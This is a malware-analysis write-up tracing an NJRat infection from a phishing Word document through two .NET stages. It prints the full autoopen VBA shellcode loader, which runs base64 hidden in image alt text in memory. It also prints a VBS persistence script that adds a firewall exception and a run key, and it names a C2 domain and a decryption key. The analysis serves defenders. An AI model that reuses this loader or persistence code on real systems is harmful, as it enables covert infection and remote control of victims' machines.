---
tags: RATs
---
## NJRat Injection From Malicious Document

Another RAT variant, NJRat is typically attributed to ECRime actors, it is supposedly popular with actors in the Middle East. It's primary infection vectors are phishing attacks and drive-by downloads, and like many other RATs, it has the capability to log keystrokes, access the victim's camera, steal credentials stored in browsers, open a reverse shell, upload/download files, view the victim's desktop, perform process, file, and registry manipulations, etc...

This sample was taken from the following [tweet](https://twitter.com/DmitriyMelikov/status/1696050783790207060)

[-] Maldoc [VirusTotal](https://www.virustotal.com/gui/file/12237938501141149337015c546b5e02acf3b98c1c26a84b5b4befd97d0f66d0/detection)

[-] PE Payload [VirusTotal](https://www.virustotal.com/gui/file/66702e21faa38c24f49a33112d2036d8f3b6bcfd686db47299a4dc44dedf13d8/detection)

## Maldoc

Like most other maldocs which leverage macros, the document lures the user into enabling content.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/da75e6b8-26e0-4d18-ba83-fd86a19bcdd9)

We can interrogate this macro by using OLE tools to view it.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/c521ee37-e76b-4b24-b3f7-7bf4dd102d94)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/66db0700-4e12-4eba-94e4-6621bb1b38d7)

```
Attribute VB_Name = "Module1"
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal six As Long, ByVal five As Long, ByVal four As LongPtr, three As Long, ByVal two As Long, one As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal seven As Long, ByVal eight As Long, ByVal nine As Long, ByVal ten As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal eleven As LongPtr, ByVal twelve As LongPtr, ByVal thirteen As Long) As LongPtr
Public Function db(base64) As Byte()
  Dim DM As Variant, EL As Variant
  Set DM = CreateObject("Microsoft.XMLDOM")
  Set EL = DM.createElement("tmp")
  EL.DataType = "bin.base64"
  EL.Text = base64
  db = EL.NodeTypedValue
End Function

Sub autoopen()
    Dim var2() As Byte
    Dim var4 As LongPtr
    Variables = ActiveDocument.InlineShapes(1).AlternativeText
    var2 = db(Variables)
    var6 = VirtualAlloc(0, UBound(var2), &H1000, &H40)
    var4 = RtlMoveMemory(var6, VarPtr(var2(0)), UBound(var2))
    var4 = CreateThread(0, 0, var6, 0, 0, 0)

   ActiveDocument.Range.Font.Hidden = False
End Sub
```

Essentially, a Base64 string is being taken from ActiveDocument.InlineShapes(1).AlternativeText and decoded, we can assess that the contents are then executed in memory using CreateThread, VirtualAlloc and RtlMoveMemory API calls.

The base64 string is hidden inside a text box on the first page of the document, utilising the Alternative Text field

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/4c944195-0f30-4bdb-bf49-6967865241bd)

I found the full string by querying the 'Data' stream, using OLE tools.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/fe007626-91e1-4cc1-b51f-5667a6ddfdf0)

_Base64 Snippet:_

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/53b37b49-c1de-4051-83c8-fae9faddce0c)


Once this code is injected and executed, it drops a PE in the location 'C:\Users\user\AppData\Roaming\netflex\netflex.exe', as well as employing some persistence mechanisms, such as a vbs script in the startup folder and a registry run key.

**VBS Script**
```
dim shellobj
set shellobj = wscript.createobject("http://wscript.shell")
ddd= "netsh firewall add allowedprogram c:\users\user\appdata\roaming\netflex\netflex.exe ""netflex.exe"" ENABLE"
cmdshell(ddd)
shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\"
split ("netflex.exe",".")(0), "c:\users\user\appdata\roaming\netflex\netflex.exe", "REG_SZ"
function cmdshell (cmd)
dim httpobj,oexec,readallfromany
set oexec = shellobj.exec ("%comspec% /C /Q /K /S"
if not oexec.stdout.atendofstream then
readallfromany = oexec.stdout.readall
elseif not oexec.stderr.atendofstream then
readallfromany = oexec.stderr.readall
readallfromany = ""
end if
cmdshell = readallfromany
end function
```

Added to the Startup directory, the vbs script adds the 'netflex' binary as an exception against Windows Firewall and creates a registry run key as a persistence mechanism.

## 1st Executable 

Taking a look at the dropped 'netflex.exe' in DNSpy, there are a few things to note.

Firstly, the binary does a basic check to decide if the host is in a virtualised environment by querying Win32_CacheMemory

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/6882b2c3-d2b7-4700-b20d-9296049a7200)

If there is a value for Win32_CacheMemory, the program assumes the host is not a virtual machine and will execute the next function.

The next function involves breaking/disabling AMSI and ETW, likely through the use of SharpUnhooker or a similar tool.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/48e550fc-4b5e-4fcf-9e93-438232dbdc9d)


Next up is the main function, which essentially decrypts and executes a payload in memory.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/af3e374a-7c42-4e6f-8775-aae8ad36c471)

The first line derives an AES key by getting the SHA 256 value of Settings.aes_key and taking the first 32 bytes.

The second line takes the contents of baseData, converts it from base64, decompresses the data with the Decompress function, decrypts the data and finally base64 decodes the unencrypted data.

_Decompress Function_

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/a0e449f9-0ef4-4d75-b12f-19acbe97c7dd)

The key point here is that the first 4 bytes of baseData declare the length of the data and are not needed for decompression.

The Settings class is compromised of 3 key components, baseData, aes_key and aes_iv.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/1f4f0997-0af7-488a-bfde-bdd9bfda3e2d)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/6f646fb8-e4a7-4d4b-b7db-b210541829ea)

We now have everything needed to decrypt the base64 string.

1) Copy and paste the baseData string, convert it from base64.
   
2) Remove the first 4 bytes
   
3) Decompress with Gunzip
   
4) AES decrypt with base64 key "78e3e7cc513ff8ae00a177366efa4060" _(First 32 bytes of the SHA 256 value of'Q4NP7JPHRA5AJB28')_
   
5) Decode from base64

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/aa810be8-fab3-4223-bf4a-7d1de792bfdd)

This leaves us with another .NET executable.

## 2nd Executable

Within this executable, we can see the C2 domain and installation directory being declared: netflex.duckdns[.]org:2255

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/6f7fd25f-61d4-4658-bfac-a22c4f894da3)

There is also the capability for replication across removable media drives, creating the same vbs script which was mentioned before.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/381c8cc6-fca3-42da-ad73-5d1b4f3e790f)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/8eb4112f-fa44-46a2-924a-711cf073aca0)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/b47f825d-f9e8-4a07-b3be-14859f79be54)

And previously noted registry run key additions.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/d6b7e8d2-0be3-448d-9eb2-f1bb0ec4b51c)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/d7224c19-bd8c-4827-a730-1183d14bfcc3)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/f4bf9291-5090-486c-bffd-33e51d3adcc3)

As well as the binary being copied to the Startup directory.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/27e7f7c9-0c18-4648-9119-7acc0357a85d)

















